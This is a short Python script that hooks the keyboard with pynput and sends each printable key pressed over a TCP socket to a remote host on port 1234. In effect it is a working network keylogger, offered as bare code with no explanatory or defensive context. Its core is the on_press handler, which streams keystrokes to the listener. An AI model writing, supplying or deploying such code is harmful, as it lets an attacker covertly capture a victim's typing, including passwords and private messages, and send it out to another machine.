from time import sleep
from pynput.keyboard import Listener,Key
import socket

HOST=''
PORT=1234

sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect((HOST,PORT))

def on_press(key):
    try:
        pressed_key=key.char
        sock.sendall(pressed_key.encode())

    except Exception as E:
        print(f"Exception :{E} \n Key : {key}")

def on_release(key):
    try:
        if key !=Key.esc:
            print(f"Key {key} is released")
        else:
            return False
        
    except Exception as E:
        print(f"Exception :{E} \n Key : {key}")       

listener=Listener(on_press=on_press,on_release=on_release)
listener.start()

try:
    while listener.running:
        sleep(0.1)

except KeyboardInterrupt:
    pass